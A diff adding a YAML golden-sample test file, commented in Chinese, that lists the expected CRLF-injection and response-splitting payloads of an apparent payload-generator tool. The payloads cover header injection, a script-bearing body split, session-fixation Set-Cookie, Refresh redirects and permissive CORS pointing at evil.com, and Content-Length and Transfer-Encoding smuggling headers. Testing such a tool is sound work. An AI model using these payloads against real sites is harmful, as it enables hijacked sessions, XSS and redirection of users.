@@ -1,0 +1,254 @@
+# CRLF 注入 / 响应拆分黄金样本。
+#
+# 期望值全部**照着 body 手推**：槽位（主要是 nl 的 seq 字段）代入 → 变量替换 →
+# 没有绕过、没有传输编码，所以 raw 就是代入后的原串。
+# nl 是字典槽位，`<<nl.seq>>` 的取值就是选项里的 seq，逐字节写下来即可。
+#
+# 两处容易写错、特意各留了一条样本：
+#   1. nl=raw 时 seq 是**真的 CR LF 两个字符**（不是 %0d%0a 这四个可见字符），
+#      所以期望值用双引号写 \r\n——这也是「原样形态」和「编码形态」的区别所在。
+#   2. cookie.set 里 sid 漏填时保留 <<sid>> 字面量（契约 3），没有默认值。
+#
+# content_type 是 raw / html，两者都没有可靠 parser，运行期会如实返回
+# 「未校验」，所以每条都断言 syntax: unchecked——写 ok 会挂，写 fail 是撒谎。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= 基本拆分与换行变形 =================
+
+  - name: CRLF · 注入自定义头（默认 %0d%0a）
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.header
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: '%0d%0aX-Crlf-Probe:%20injected'
+      # 没有引号字面量、没有绕过，不该有任何提示
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CRLF · 注入自定义头（原样 CRLF 两个字符）
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.header
+      slots: {nl: raw}
+      outputs: [raw]
+    expect:
+      # seq 就是真的回车换行，URL 显示时是 %0D%0A，但载荷里发出去的是原始字节
+      payload: "\r\nX-Crlf-Probe:%20injected"
+      syntax: unchecked
+
+  - name: CRLF · 注入自定义头（双重编码 %250d%250a）
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.header
+      slots: {nl: dbl}
+      outputs: [raw]
+    expect:
+      payload: '%250d%250aX-Crlf-Probe:%20injected'
+      syntax: unchecked
+
+  - name: CRLF · 注入自定义头（只有 %0a）
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.header
+      slots: {nl: lf}
+      outputs: [raw]
+    expect:
+      payload: '%0aX-Crlf-Probe:%20injected'
+      syntax: unchecked
+
+  - name: CRLF · 注入自定义头（走 curl 渲染层）
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.header
+      slots: {nl: crlf}
+      outputs: [raw, curl]
+    expect:
+      payload: '%0d%0aX-Crlf-Probe:%20injected'
+      # submit 默认 query + param=id + host=example.com：
+      # 载荷按 safe="" 整体 URL 编码——% 变成 %25（所以 %0d 变 %250d）、
+      # : 变成 %3A，字母数字和 - 不编码——再拼成 http://example.com/?id=...，
+      # 最后由 bash 的 shell_quote 包一层单引号
+      outputs:
+        curl: "curl 'http://example.com/?id=%250d%250aX-Crlf-Probe%3A%2520injected'"
+
+  - name: CRLF · 裸换行（默认 %0d%0a）
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.bare
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      # body 就是 <<nl.seq>>，代入后只剩换行本身
+      payload: '%0d%0a'
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CRLF · 裸换行（只有 %0d）
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.bare
+      slots: {nl: cr}
+      outputs: [raw]
+    expect:
+      payload: '%0d'
+      syntax: unchecked
+
+  - name: CRLF · 续行写法（换行后跟空格）
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.folded
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      # <<nl.seq>> + "%20" + "X-Crlf-Probe:" + "%20" + "1"
+      payload: '%0d%0a%20X-Crlf-Probe:%201'
+      syntax: unchecked
+
+  - name: CRLF · Unicode 换行变形
+    state:
+      vuln: crlf
+      template: crlf.generic.probe.unicode
+      outputs: [raw]
+    expect:
+      # 无槽位无变量，body 原样输出：U+560A 与 U+560D 的 UTF-8 编码
+      payload: '%e5%98%8a%e5%98%8dX-Crlf-Probe:%20injected'
+      syntax: unchecked
+
+  # ================= 拆出新响应体 =================
+
+  - name: CRLF · 拆出新响应体（HTML）
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.html
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      # 两个 <<nl.seq>> 连着写：%0d%0a%0d%0a 结束头段，后面就是新的响应体
+      payload: '%0d%0a%0d%0a<html><body><script>alert(document.domain)</script></body></html>'
+      syntax: unchecked
+
+  - name: CRLF · 拆出新响应体（原样 CRLF 形态）
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.html
+      slots: {nl: raw}
+      outputs: [raw]
+    expect:
+      payload: "\r\n\r\n<html><body><script>alert(document.domain)</script></body></html>"
+      syntax: unchecked
+
+  - name: CRLF · 拆出新响应体（只留文本标记）
+    state:
+      vuln: crlf
+      template: crlf.generic.body.split.marker
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: '%0d%0a%0d%0acrlf-split-marker'
+      checks_count: 0
+      syntax: unchecked
+
+  # ================= 拆出具体的头 =================
+
+  - name: CRLF · 注入 Set-Cookie（会话固定）
+    state:
+      vuln: crlf
+      template: crlf.generic.cookie.set
+      slots: {nl: crlf}
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      # <<sid>> 只在变量阶段替换，分号和空格是 body 里写死的
+      payload: '%0d%0aSet-Cookie:%20sessionid=abc123;%20Path=/'
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CRLF · 注入 Set-Cookie 但没填 sid（契约 3，不给默认值）
+    state:
+      vuln: crlf
+      template: crlf.generic.cookie.set
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: '%0d%0aSet-Cookie:%20sessionid=<<sid>>;%20Path=/'
+      syntax: unchecked
+
+  - name: CRLF · 注入 Content-Type
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_type
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: '%0d%0aContent-Type:%20text/html;%20charset=utf-8'
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CRLF · 注入 Refresh 跳转（默认 https）
+    state:
+      vuln: crlf
+      template: crlf.generic.header.refresh
+      slots: {nl: crlf, scheme: https}
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      payload: '%0d%0aRefresh:%200;url=https://evil.com/'
+      syntax: unchecked
+
+  - name: CRLF · 注入 Refresh 跳转（换 http）
+    state:
+      vuln: crlf
+      template: crlf.generic.header.refresh
+      slots: {nl: crlf, scheme: http}
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      payload: '%0d%0aRefresh:%200;url=http://evil.com/'
+      syntax: unchecked
+
+  - name: CRLF · 注入 Content-Length（默认长度 0）
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_length
+      slots: {nl: crlf, size: "0"}
+      outputs: [raw]
+    expect:
+      payload: '%0d%0aContent-Length:%200'
+      syntax: unchecked
+
+  - name: CRLF · 注入 Content-Length（换个长度）
+    state:
+      vuln: crlf
+      template: crlf.generic.header.content_length
+      slots: {nl: crlf, size: "100"}
+      outputs: [raw]
+    expect:
+      payload: '%0d%0aContent-Length:%20100'
+      syntax: unchecked
+
+  - name: CRLF · 注入 Transfer-Encoding
+    state:
+      vuln: crlf
+      template: crlf.generic.header.transfer_encoding
+      slots: {nl: crlf}
+      outputs: [raw]
+    expect:
+      payload: '%0d%0aTransfer-Encoding:%20chunked'
+      syntax: unchecked
+
+  - name: CRLF · 注入 CORS 头
+    state:
+      vuln: crlf
+      template: crlf.generic.header.cors
+      slots: {nl: crlf}
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      # 两个 <<nl.seq>>：第一次拆出 ACAO，第二次拆出 ACAC
+      payload: '%0d%0aAccess-Control-Allow-Origin:%20https://evil.com%0d%0aAccess-Control-Allow-Credentials:%20true'
+      checks_count: 0
+      syntax: unchecked
